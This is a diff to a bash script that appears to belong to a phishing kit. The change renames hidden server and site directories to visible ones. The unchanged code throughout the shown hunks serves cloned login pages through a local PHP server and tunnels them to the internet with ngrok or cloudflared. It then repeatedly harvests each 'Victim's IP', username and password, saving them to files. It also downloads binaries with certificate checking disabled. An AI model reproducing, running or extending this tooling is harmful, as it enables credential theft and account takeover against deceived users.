@@ -102,14 +102,14 @@ MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(prin
 RESETBG="$(printf '\e[0m\n')"
 
 ## Directories
-if [[ ! -d ".server" ]]; then
-	mkdir -p ".server"
+if [[ ! -d "server" ]]; then
+	mkdir -p "server"
 fi
-if [[ -d ".server/www" ]]; then
-	rm -rf ".server/www"
-	mkdir -p ".server/www"
+if [[ -d "server/www" ]]; then
+	rm -rf "server/www"
+	mkdir -p "server/www"
 else
-	mkdir -p ".server/www"
+	mkdir -p "server/www"
 fi
 if [[ -e ".cld.log" ]]; then
 	rm -rf ".cld.log"
@@ -226,9 +226,9 @@ download_ngrok() {
 	wget --no-check-certificate "$url" > /dev/null 2>&1
 	if [[ -e "$file" ]]; then
 		unzip "$file" > /dev/null 2>&1
-		mv -f ngrok .server/ngrok > /dev/null 2>&1
+		mv -f ngrok server/ngrok > /dev/null 2>&1
 		rm -rf "$file" > /dev/null 2>&1
-		chmod +x .server/ngrok > /dev/null 2>&1
+		chmod +x server/ngrok > /dev/null 2>&1
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
 		{ reset_color; exit 1; }
@@ -244,8 +244,8 @@ download_cloudflared() {
 	fi
 	wget --no-check-certificate "$url" > /dev/null 2>&1
 	if [[ -e "$file" ]]; then
-		mv -f "$file" .server/cloudflared > /dev/null 2>&1
-		chmod +x .server/cloudflared > /dev/null 2>&1
+		mv -f "$file" server/cloudflared > /dev/null 2>&1
+		chmod +x server/cloudflared > /dev/null 2>&1
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
 		{ reset_color; exit 1; }
@@ -254,7 +254,7 @@ download_cloudflared() {
 
 ## Install ngrok
 install_ngrok() {
-	if [[ -e ".server/ngrok" ]]; then
+	if [[ -e "server/ngrok" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
@@ -274,7 +274,7 @@ install_ngrok() {
 
 ## Install Cloudflared
 install_cloudflared() {
-	if [[ -e ".server/cloudflared" ]]; then
+	if [[ -e "server/cloudflared" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
@@ -339,30 +339,30 @@ PORT='8080'
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-	cp -rf .sites/"$website"/* .server/www
-	cp -f .sites/ip.php .server/www/
+	cp -rf sites/"$website"/* server/www
+	cp -f sites/ip.php server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
+	cd server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
 
 ## Get IP address
 capture_ip() {
-	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+	IP=$(grep -a 'IP:' server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
-	cat .server/www/ip.txt >> ip.txt
+	cat server/www/ip.txt >> ip.txt
 }
 
 ## Get credentials
 capture_creds() {
-	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
-	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
+	ACCOUNT=$(grep -o 'Username:.*' server/www/usernames.txt | cut -d " " -f2)
+	PASSWORD=$(grep -o 'Pass:.*' server/www/usernames.txt | cut -d ":" -f2)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
-	cat .server/www/usernames.txt >> usernames.dat
+	cat server/www/usernames.txt >> usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
@@ -370,16 +370,16 @@ capture_creds() {
 capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
-		if [[ -e ".server/www/ip.txt" ]]; then
+		if [[ -e "server/www/ip.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
 			capture_ip
-			rm -rf .server/www/ip.txt
+			rm -rf server/www/ip.txt
 		fi
 		sleep 0.75
-		if [[ -e ".server/www/usernames.txt" ]]; then
+		if [[ -e "server/www/usernames.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
 			capture_creds
-			rm -rf .server/www/usernames.txt
+			rm -rf server/www/usernames.txt
 		fi
 		sleep 0.75
 	done
@@ -392,9 +392,9 @@ start_ngrok() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & 
+        sleep 2 && termux-chroot ./server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & 
     else
-        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+        sleep 2 && ./server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
 
 	{ sleep 8; clear; banner_small; }
@@ -415,9 +415,9 @@ start_cloudflared() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
     else
-        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+        sleep 2 && ./server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
     fi
 
 	{ sleep 8; clear; banner_small; }
